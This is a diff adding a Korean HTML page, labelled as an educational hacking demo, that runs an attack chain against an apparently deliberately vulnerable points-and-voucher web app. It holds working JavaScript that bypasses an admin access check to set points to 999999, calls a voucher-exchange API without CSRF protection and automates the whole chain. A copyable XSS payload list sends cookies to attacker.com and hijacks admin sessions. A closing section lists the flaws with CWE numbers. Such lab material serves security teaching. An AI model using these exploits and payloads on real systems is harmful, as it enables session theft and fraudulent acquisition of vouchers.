@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>공격 시연 페이지 (교육용)</title>
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            background: #1a1a1a;
+            color: #00ff00;
+            padding: 20px;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        .warning {
+            background: #ff0000;
+            color: white;
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            font-weight: bold;
+        }
+        .section {
+            background: #2a2a2a;
+            padding: 20px;
+            margin-bottom: 20px;
+            border-radius: 10px;
+            border: 2px solid #00ff00;
+        }
+        h1, h2 {
+            color: #ff6b6b;
+        }
+        button {
+            background: #ff6b6b;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            margin: 5px;
+            cursor: pointer;
+            border-radius: 5px;
+            font-weight: bold;
+        }
+        button:hover {
+            background: #ff4444;
+        }
+        input, select {
+            padding: 8px;
+            margin: 5px;
+            border-radius: 5px;
+            border: 1px solid #00ff00;
+            background: #1a1a1a;
+            color: #00ff00;
+        }
+        .log {
+            background: #000;
+            padding: 10px;
+            margin-top: 10px;
+            border-radius: 5px;
+            max-height: 300px;
+            overflow-y: auto;
+            font-size: 12px;
+        }
+        .success {
+            color: #00ff00;
+        }
+        .error {
+            color: #ff0000;
+        }
+        .info {
+            color: #ffff00;
+        }
+    </style>
+</head>
+<body>
+    <div class="warning">
+        ⚠️ 경고: 이 페이지는 교육 목적의 모의해킹 시연용입니다. 실제 운영 환경에서 사용 금지!
+    </div>
+
+    <h1>🎯 시나리오 1: 권한 상승을 통한 문화상품권 부정 취득</h1>
+
+    <!-- 1단계: 정보 수집 -->
+    <div class="section">
+        <h2>1️⃣ 정보 수집 (Reconnaissance)</h2>
+        <p>공격자의 사용자 ID를 확인합니다.</p>
+        <button onclick="getCurrentUserInfo()">내 정보 조회</button>
+        <div id="userInfo" class="log"></div>
+    </div>
+
+    <!-- 2단계: 권한 우회 - 포인트 조작 -->
+    <div class="section">
+        <h2>2️⃣ 취약점 악용: 권한 체크 우회 (Broken Access Control)</h2>
+        <p>관리자 권한이 없어도 포인트를 조작할 수 있는 취약한 API 발견!</p>
+        <label>타겟 User ID: <input type="number" id="targetUserId" value="1" /></label>
+        <label>새 포인트: <input type="number" id="newPoints" value="999999" /></label>
+        <button onclick="exploitPointsAPI()">포인트 조작 실행</button>
+        <div id="exploitLog" class="log"></div>
+    </div>
+
+    <!-- 3단계: CSRF - 문화상품권 교환 -->
+    <div class="section">
+        <h2>3️⃣ CSRF 공격: 자동 문화상품권 교환</h2>
+        <p>CSRF 보호가 비활성화된 상태에서 교환 API 자동 호출</p>
+        <button onclick="csrfExchangeVoucher()">문화상품권 교환 (CSRF)</button>
+        <div id="csrfLog" class="log"></div>
+    </div>
+
+    <!-- 4단계: XSS 공격 페이로드 -->
+    <div class="section">
+        <h2>4️⃣ XSS 공격: 악성 스크립트 게시글 생성</h2>
+        <p>게시판에 악성 스크립트를 삽입하여 관리자 세션 탈취 가능</p>
+        <h3>XSS 페이로드 예제:</h3>
+        <textarea id="xssPayload" rows="10" style="width: 100%; background: #000; color: #00ff00; padding: 10px; font-family: monospace;">
+<!-- 쿠키 탈취 페이로드 -->
+<script>
+fetch('http://attacker.com/steal?cookie=' + document.cookie);
+</script>
+
+<!-- 세션을 이용한 자동 포인트 증가 -->
+<script>
+fetch('/admin/api/users/1/points', {
+  method: 'POST',
+  headers: {'Content-Type': 'application/json'},
+  body: JSON.stringify({points: 999999}),
+  credentials: 'include'
+}).then(r => r.json()).then(d => alert('포인트 변조 성공: ' + JSON.stringify(d)));
+</script>
+
+<!-- 이미지 태그를 이용한 간단한 XSS -->
+<img src=x onerror="alert('XSS 공격 성공!')">
+
+<!-- 관리자가 보면 자동으로 문화상품권 교환 -->
+<script>
+fetch('/api/auth/exchange-voucher', {
+  method: 'POST',
+  credentials: 'include'
+}).then(r => r.json()).then(d => console.log('교환 완료:', d));
+</script>
+        </textarea>
+        <button onclick="copyXSSPayload()">페이로드 복사</button>
+        <p class="info">💡 이 페이로드를 게시판에 붙여넣으면 다른 사용자(특히 관리자)가 게시글을 볼 때 자동 실행됩니다.</p>
+    </div>
+
+    <!-- 5단계: 공격 체인 자동화 -->
+    <div class="section">
+        <h2>5️⃣ 전체 공격 체인 자동 실행</h2>
+        <p>모든 단계를 순차적으로 실행합니다.</p>
+        <button onclick="runFullAttack()">🚀 전체 공격 실행</button>
+        <div id="fullAttackLog" class="log"></div>
+    </div>
+
+    <script>
+        let currentUser = null;
+
+        // 1단계: 현재 사용자 정보 조회
+        async function getCurrentUserInfo() {
+            const log = document.getElementById('userInfo');
+            log.innerHTML = '<span class="info">⏳ 사용자 정보 조회 중...</span>';
+
+            try {
+                const response = await fetch('/api/auth/me', {
+                    credentials: 'include'
+                });
+
+                if (!response.ok) {
+                    throw new Error('로그인이 필요합니다.');
+                }
+
+                const data = await response.json();
+                currentUser = data;
+
+                log.innerHTML = `
+                    <span class="success">✅ 사용자 정보 조회 성공</span><br>
+                    User ID: ${data.userId}<br>
+                    Username: ${data.username}<br>
+                    현재 포인트: ${data.points}<br>
+                    역할: ${data.role}<br>
+                    이메일: ${data.email}
+                `;
+
+                // 자동으로 User ID 입력
+                document.getElementById('targetUserId').value = data.userId;
+
+            } catch (error) {
+                log.innerHTML = `<span class="error">❌ 오류: ${error.message}</span>`;
+            }
+        }
+
+        // 2단계: 권한 체크 우회 - 포인트 조작
+        async function exploitPointsAPI() {
+            const log = document.getElementById('exploitLog');
+            const userId = document.getElementById('targetUserId').value;
+            const points = document.getElementById('newPoints').value;
+
+            log.innerHTML = '<span class="info">⏳ 포인트 조작 시도 중...</span>';
+
+            try {
+                const response = await fetch(`/admin/api/users/${userId}/points`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ points: parseInt(points) }),
+                    credentials: 'include'
+                });
+
+                const data = await response.json();
+
+                if (response.ok) {
+                    log.innerHTML = `
+                        <span class="success">🎉 포인트 조작 성공!</span><br>
+                        ${JSON.stringify(data, null, 2)}
+                    `;
+                } else {
+                    log.innerHTML = `<span class="error">❌ 실패: ${JSON.stringify(data)}</span>`;
+                }
+            } catch (error) {
+                log.innerHTML = `<span class="error">❌ 오류: ${error.message}</span>`;
+            }
+        }
+
+        // 3단계: CSRF - 문화상품권 교환
+        async function csrfExchangeVoucher() {
+            const log = document.getElementById('csrfLog');
+            log.innerHTML = '<span class="info">⏳ 문화상품권 교환 시도 중...</span>';
+
+            try {
+                const response = await fetch('/api/auth/exchange-voucher', {
+                    method: 'POST',
+                    credentials: 'include'
+                });
+
+                const data = await response.json();
+
+                if (response.ok && data.success) {
+                    log.innerHTML = `
+                        <span class="success">🎁 문화상품권 교환 성공!</span><br>
+                        ${data.message}<br>
+                        남은 포인트: ${data.remainingPoints}
+                    `;
+                } else {
+                    log.innerHTML = `<span class="error">❌ 실패: ${data.message || JSON.stringify(data)}</span>`;
+                }
+            } catch (error) {
+                log.innerHTML = `<span class="error">❌ 오류: ${error.message}</span>`;
+            }
+        }
+
+        // 4단계: XSS 페이로드 복사
+        function copyXSSPayload() {
+            const payload = document.getElementById('xssPayload').value;
+            navigator.clipboard.writeText(payload).then(() => {
+                alert('✅ XSS 페이로드가 클립보드에 복사되었습니다!\n게시판에 붙여넣으세요.');
+            });
+        }
+
+        // 5단계: 전체 공격 체인 실행
+        async function runFullAttack() {
+            const log = document.getElementById('fullAttackLog');
+            log.innerHTML = '<span class="info">🚀 전체 공격 체인 시작...</span><br>';
+
+            // Step 1: 정보 수집
+            log.innerHTML += '<span class="info">[Step 1] 정보 수집 중...</span><br>';
+            await getCurrentUserInfo();
+            await sleep(1000);
+
+            if (!currentUser) {
+                log.innerHTML += '<span class="error">❌ 로그인이 필요합니다. 공격 중단.</span>';
+                return;
+            }
+
+            // Step 2: 포인트 조작
+            log.innerHTML += '<span class="info">[Step 2] 포인트 조작 중...</span><br>';
+            await exploitPointsAPI();
+            await sleep(1000);
+
+            // Step 3: 문화상품권 교환
+            log.innerHTML += '<span class="info">[Step 3] 문화상품권 교환 중...</span><br>';
+            await csrfExchangeVoucher();
+            await sleep(1000);
+
+            log.innerHTML += '<span class="success">🎉 전체 공격 완료!</span>';
+        }
+
+        function sleep(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+
+        // 페이지 로드 시 자동으로 사용자 정보 조회
+        window.onload = function() {
+            setTimeout(() => {
+                getCurrentUserInfo();
+            }, 500);
+        };
+    </script>
+
+    <div class="section" style="margin-top: 40px;">
+        <h2>📚 공격 시나리오 요약</h2>
+        <ol>
+            <li><strong>정보 수집</strong>: 자신의 User ID 확인</li>
+            <li><strong>권한 상승</strong>: 관리자 권한 체크가 누락된 API 발견 및 악용</li>
+            <li><strong>포인트 조작</strong>: 자신의 포인트를 999,999로 증가</li>
+            <li><strong>CSRF 공격</strong>: CSRF 보호가 없는 교환 API 호출</li>
+            <li><strong>문화상품권 취득</strong>: 부정하게 획득한 포인트로 문화상품권 교환</li>
+            <li><strong>(선택) XSS</strong>: 게시판에 악성 스크립트 삽입하여 다른 사용자 공격</li>
+        </ol>
+
+        <h3>발견된 취약점</h3>
+        <ul>
+            <li>❌ <strong>Broken Access Control</strong> (CWE-284): /admin/api/users/{userId}/points에서 관리자 권한 체크 누락</li>
+            <li>❌ <strong>CSRF</strong> (CWE-352): insecure 프로필에서 CSRF 보호 비활성화</li>
+            <li>❌ <strong>XSS</strong> (CWE-79): 게시판에서 HTML 이스케이프 없이 innerHTML 사용</li>
+            <li>❌ <strong>Session Fixation</strong> (CWE-384): 로그인 시 세션 ID 재생성 없음</li>
+            <li>❌ <strong>Missing Transaction</strong>: 포인트 차감 시 @Transactional 없음</li>
+        </ul>
+    </div>
+</body>
+</html>
